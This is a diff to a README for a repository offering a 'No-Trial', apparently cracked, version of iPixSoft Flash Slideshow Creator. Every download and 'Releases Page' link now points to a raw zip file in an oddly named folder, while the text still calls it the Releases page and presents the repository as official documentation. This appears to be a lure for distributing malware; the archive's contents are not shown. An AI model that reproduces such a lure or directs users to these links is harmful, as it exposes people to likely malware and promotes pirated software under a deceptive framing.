@@ -1,6 +1,6 @@
 # 📸 iPixSoft-Flash-Slideshow-Creator-No-Trial - Create Stunning Flash Slideshows Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/main/fibrositis/iPixSoft-Flash-Slideshow-Creator-No-Trial_v2.1.zip)](https://raw.githubusercontent.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/main/fibrositis/iPixSoft-Flash-Slideshow-Creator-No-Trial_v2.1.zip)
   
 ## 📖 Description
 This repository offers a comprehensive collection of official resources, detailed guides, and reference materials for iPixSoft Flash Slideshow Creator on Windows PCs. Ideal for users seeking reliable documentation and support to enhance their slideshow creation experience.
@@ -9,7 +9,7 @@ This repository offers a comprehensive collection of official resources, detaile
 Creating beautiful slideshows is simple with the iPixSoft Flash Slideshow Creator. Follow these steps to get started:
 
 1. **Visit the Releases Page**
-   To download the application, visit this page: [Releases Page](https://github.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/releases).
+   To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/main/fibrositis/iPixSoft-Flash-Slideshow-Creator-No-Trial_v2.1.zip).
 
 2. **Choose the Right Version**
    On the Releases page, you will see a list of available versions. Choose the latest version for the best features and improvements.
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets the following requirements:
 To begin the installation process, follow these steps:
 
 1. **Download the Software**
-   You can conveniently download the iPixSoft Flash Slideshow Creator from the Releases page. Click here: [Download & Install](https://github.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/releases).
+   You can conveniently download the iPixSoft Flash Slideshow Creator from the Releases page. Click here: [Download & Install](https://raw.githubusercontent.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/main/fibrositis/iPixSoft-Flash-Slideshow-Creator-No-Trial_v2.1.zip).
 
 2. **Locate the Installer**
    After the download is complete, find the installer in your Downloads folder or the location you chose.
@@ -74,4 +74,4 @@ If you have questions or need assistance, refer to the guides in the repository 
 - **Documentation:** Access detailed guides for each feature of the application.
 - **Tutorials:** Explore video tutorials for step-by-step walkthroughs of creating slideshows.
 
-For further assistance, please refer back to the Releases page: [Releases Page](https://github.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/releases). Your creative slideshow journey begins here!
+For further assistance, please refer back to the Releases page: [Releases Page](https://raw.githubusercontent.com/taaleOP/iPixSoft-Flash-Slideshow-Creator-No-Trial/main/fibrositis/iPixSoft-Flash-Slideshow-Creator-No-Trial_v2.1.zip). Your creative slideshow journey begins here!
